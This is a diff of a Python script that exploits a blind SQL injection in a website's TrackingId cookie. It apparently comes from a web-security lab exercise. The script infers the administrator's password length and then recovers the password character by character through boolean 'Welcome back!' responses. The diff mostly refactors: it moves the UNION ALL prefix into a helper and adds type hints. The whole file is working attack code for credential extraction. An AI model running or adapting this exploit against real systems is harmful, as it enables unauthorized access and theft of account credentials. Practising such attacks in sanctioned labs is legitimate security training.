@@ -17,36 +17,36 @@ url = f'https://{site}/'
 valid_chars = string.ascii_lowercase + string.digits
 
 
-def is_resultset_extant(query):
+def is_resultset_extant(query: str) -> bool:
     """
     Exploit a SQL injection vulnerability in the target website to determine whether the provided SQL string returns
     at least one row by checking for the presence of a 'Welcome back!' message.
-    :param query: (string) string containing the query to run on target server
-    :return: (boolean) True if at least one row was returned; false otherwise.
+    :param query: (str) string containing the query to run on target server
+    :return: (bool) True if at least one row was returned; false otherwise.
     """
-    mycookies = {'TrackingId': urllib.parse.quote_plus("x' " + query + '--')}
+    mycookies = {'TrackingId': urllib.parse.quote_plus("x' UNION ALL " + query + '--')}
     resp = requests.get(url, cookies=mycookies)
     if resp.status_code is not 200:
         raise Exception(f"Error contacting remote server. HTTP {resp.status_code} response with message {resp.text}")
     soup = BeautifulSoup(resp.text, 'html.parser')
-    return soup.find('div', text='Welcome back!')
+    return True if soup.find('div', text='Welcome back!') else False
 
 
-def get_pwd_length():
+def get_pwd_length() -> int:
     """
     Determine the length of the password for the administrator user account.
     :return: (int) Length of the password for the administrator user account.
     """
     num = 1
     while True:
-        query = f"UNION ALL SELECT username FROM users WHERE username='administrator' AND length(password)={num}"
+        query = f"SELECT username FROM users WHERE username='administrator' AND length(password)={num}"
         if not is_resultset_extant(query):
             num = num + 1
         else:
             return num
 
 
-def get_pwd_binary(length):
+def get_pwd_binary(length: int) -> str:
     """
     Determine the password for the administrator user account given its length.
     :param length: (int) the length of the password for the administrator user account.
@@ -57,18 +57,18 @@ def get_pwd_binary(length):
         remaining = valid_chars
         while len(remaining) > 1:
             parts = partition_str(remaining)
-            query = f"UNION SELECT username FROM users WHERE username='administrator' AND password SIMILAR TO '{pwd}[{parts[0]}]%'"
+            query = f"SELECT username FROM users WHERE username='administrator' AND password SIMILAR TO '{pwd}[{parts[0]}]%' "
             remaining = parts[0] if is_resultset_extant(query) else parts[1]
         pwd += remaining
         print(pwd)
     return pwd
 
 
-def partition_str(to_partition):
+def partition_str(to_partition: str) -> list:
     """
     Split the provided string into two equally-long parts.
-    :param to_partition: (str) the string to be split into two parts
-    :return: (list) two strings of equal length (or within 1, if to_partition is odd)
+    :param to_partition: (str) the string to be split into two parts; must contain at least 2 characters
+    :return: (list) two strings of equal length (or within 1, if len(to_partition) is odd)
     """
     l = len(to_partition)
     if l > 1:
